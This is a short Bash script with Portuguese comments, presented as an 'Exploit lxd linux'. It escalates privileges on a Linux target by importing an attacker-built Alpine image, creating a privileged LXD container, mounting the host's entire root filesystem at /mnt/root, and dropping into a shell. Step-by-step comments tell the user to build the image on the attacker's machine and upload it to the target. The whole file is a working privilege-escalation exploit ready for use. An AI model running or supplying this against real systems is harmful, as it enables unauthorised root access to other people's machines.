#!/bin/bash

# Criando um container para escalar privilégios com o lxd

# 1 - Crie uma imagem do linux alpine com esse script:
# https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
# essa imagem deve ser criada com o usuario root na maquina do atacante.

# 2 - Faça upload da imagem e deste script para a maquina alvo.
# 3 - Execute o script na maquina alvo e informe o nome da imagem.
# 4 - Em caso de sucesso, vá para /mnt/root.

echo "|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|"
echo "|-|-|-|-|-| Exploit lxd linux |-|-|-|-|-|-|-|-|"
echo "|-|-|-|-|-|     By: Usuario   |-|-|-|-|-|-|-|-|"
echo "|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|"

if [ $# != 1 ]; then
	echo " "
	echo "Use: $0 [IMAGEM]"
	exit 1
fi

# Remover configurações
function removeAll()
{
	echo "[INFO]: Removendo configurações..."
	cd ..
	rm -rf lxd_temp
	lxc stop getRoot && lxc delete getRoot && lxc image delete alpine_img
}

echo "[*] Criando diretorio..."; mkdir "lxd_temp"
echo "[*] Copiando imagem..."; cp $1 lxd_temp/
echo "[*] Configurando container...";cd lxd_temp

if lxc image import $1 --alias alpine_img && lxd init --auto && lxc init alpine_img getRoot -c security.privileged=true && lxc config device add getRoot dirExploit disk source=/ path=/mnt/root recursive=true && lxc start getRoot; then
	echo "[+] Exploit executado com sucesso"
	lxc exec getRoot /bin/sh
	removeAll
else
	echo "[-]: Ocorreu um erro ao configurar o container"
	exit 1
fi

